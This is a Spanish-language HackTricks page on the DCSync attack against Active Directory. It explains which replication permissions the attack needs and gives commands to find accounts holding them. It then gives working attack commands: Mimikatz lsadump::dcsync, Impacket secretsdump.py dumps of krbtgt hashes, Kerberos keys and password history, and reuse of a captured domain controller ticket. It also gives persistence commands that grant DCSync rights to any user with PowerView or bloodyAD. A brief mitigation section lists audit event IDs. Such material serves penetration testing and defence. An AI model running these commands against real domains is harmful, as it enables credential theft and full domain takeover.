# DCSync

{{#include ../../banners/hacktricks-training.md}}

## DCSync

El permiso **DCSync** implica tener estos permisos sobre el propio dominio: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** y **Replicating Directory Changes In Filtered Set**.<sup>[[3]](#references)</sup>

**Notas importantes sobre DCSync:**

- El **ataque DCSync simula el comportamiento de un Domain Controller y solicita a otros Domain Controllers que repliquen información** mediante el Directory Replication Service Remote Protocol (MS-DRSR). Dado que MS-DRSR es una función válida y necesaria de Active Directory, no se puede desactivar ni inhabilitar.
- De forma predeterminada, solo los grupos **Domain Admins, Enterprise Admins, Administrators y Domain Controllers** tienen los privilegios necesarios.
- En la práctica, un **DCSync completo** necesita **`DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All`** en el contexto de nomenclatura del dominio. `DS-Replication-Get-Changes-In-Filtered-Set` suele delegarse junto con ellos, pero por sí solo es más relevante para sincronizar **atributos confidenciales o filtrados por RODC** (por ejemplo, secretos de LAPS heredado) que para obtener un volcado completo de krbtgt.<sup>[[2]](#references)</sup>
- Si alguna contraseña de cuenta está almacenada mediante cifrado reversible, Mimikatz ofrece una opción para devolver la contraseña en texto claro.

### Enumeración

Comprueba quién tiene estos permisos usando `powerview`:
```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```
Si quieres centrarte en **principals no predeterminados** con derechos de DCSync, filtra los grupos integrados con capacidad de replicación y revisa únicamente los trustees inesperados:
```powershell
$domainDN = "DC=dollarcorp,DC=moneycorp,DC=local"
$default = "Domain Controllers|Enterprise Domain Controllers|Domain Admins|Enterprise Admins|Administrators"
Get-ObjectAcl -DistinguishedName $domainDN -ResolveGUIDs |
Where-Object {
$_.ObjectType -match 'replication-get' -or
$_.ActiveDirectoryRights -match 'GenericAll|WriteDacl'
} |
Where-Object { $_.IdentityReference -notmatch $default } |
Select-Object IdentityReference,ObjectType,ActiveDirectoryRights
```
### Explotar localmente
```bash
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```
### Explotar de forma remota
```bash
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-ldapfilter '(adminCount=1)'] #Or scope the dump to objects matching an LDAP filter
[-just-dc-ntlm] #Only NTLM material, faster/cleaner when you don't need Kerberos keys
[-pwd-last-set] #To see when each account's password was last changed
[-user-status] #Show if the account is enabled/disabled while dumping
[-history] #To dump password history, may be helpful for offline password cracking
```
Ejemplos prácticos acotados:<sup>[[1]](#references)</sup>
```bash
# Only the krbtgt account
secretsdump.py -just-dc-user krbtgt <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Only privileged objects selected through LDAP
secretsdump.py -just-dc-ntlm -ldapfilter '(adminCount=1)' <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Add metadata and password history for cracking/reuse analysis
secretsdump.py -just-dc-ntlm -history -pwd-last-set -user-status <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>
```
### DCSync usando un TGT de máquina DC capturado (ccache)

En escenarios de export-mode de unconstrained-delegation, puedes capturar un TGT de máquina de un Domain Controller (por ejemplo, `DC1$@DOMAIN` para `krbtgt@DOMAIN`). Después puedes usar ese ccache para autenticarte como el DC y realizar DCSync sin una contraseña.<sup>[[5]](#references)</sup>
```bash
# Generate a krb5.conf for the realm (helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# netexec helper using KRB5CCNAME
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
netexec smb <DC_FQDN> --use-kcache --ntds

# Or Impacket with Kerberos from ccache
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```
Notas operativas:

- **La ruta de Kerberos de Impacket contacta primero con SMB** antes de realizar la llamada a DRSUAPI. Si el entorno aplica **SPN target name validation**, un volcado completo puede fallar con `Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user`.
- En ese caso, solicita primero un ticket de servicio **`cifs/<dc>`** para el DC de destino o usa **`-just-dc-user`** para la cuenta que necesites de inmediato.
- Cuando solo tienes permisos de replicación inferiores, la sincronización mediante LDAP/DirSync aún puede exponer atributos **confidential** o **RODC-filtered** (por ejemplo, el atributo heredado `ms-Mcs-AdmPwd`) sin replicar completamente krbtgt.<sup>[[2]](#references)</sup>

`-just-dc` genera 3 archivos:

- uno con los **hashes NTLM**
- uno con las **claves Kerberos**
- uno con las contraseñas en texto claro de NTDS para cualquier cuenta que tenga habilitado [**reversible encryption**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption). Puedes obtener los usuarios con reversible encryption mediante

```bash
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

### Persistencia

Si eres administrador de dominio, puedes conceder estos permisos a cualquier usuario con la ayuda de PowerView:<sup>[[3]](#references)</sup>
```bash
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```
Los operadores de Linux pueden hacer lo mismo con `bloodyAD`:
```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' add dcsync <TRUSTEE>
```
Entonces, puedes **comprobar si al usuario se le asignaron correctamente** los 3 permisos buscándolos en la salida de (deberías poder ver los nombres de los permisos dentro del campo "ObjectType"):
```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```
### Mitigación

- ID de evento de seguridad 4662 (debe estar habilitada la Audit Policy para el objeto): se realizó una operación en un objeto<sup>[[4]](#references)</sup>
- ID de evento de seguridad 5136 (debe estar habilitada la Audit Policy para el objeto): se modificó un objeto del servicio de directorio
- ID de evento de seguridad 4670 (debe estar habilitada la Audit Policy para el objeto): se cambiaron los permisos de un objeto
- AD ACL Scanner: crea y compara informes de ACL. [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## References

- [1] [Registro de cambios de Impacket](https://github.com/fortra/impacket/blob/master/ChangeLog.md)
- [2] [DirSync: aprovechando Replication Get-Changes y Get-Changes-In-Filtered-Set](https://simondotsh.com/infosec/2022/07/11/dirsync.html)
- [3] [DCSync: extraer hashes de contraseñas del Domain Controller](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
- [4] [DCSync](https://yojimbosecurity.ninja/dcsync/)
- [5] [HTB: Delegate — credenciales de SYSVOL → Targeted Kerberoast → Unconstrained Delegation → DCSync para obtener DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
{{#include ../../banners/hacktricks-training.md}}
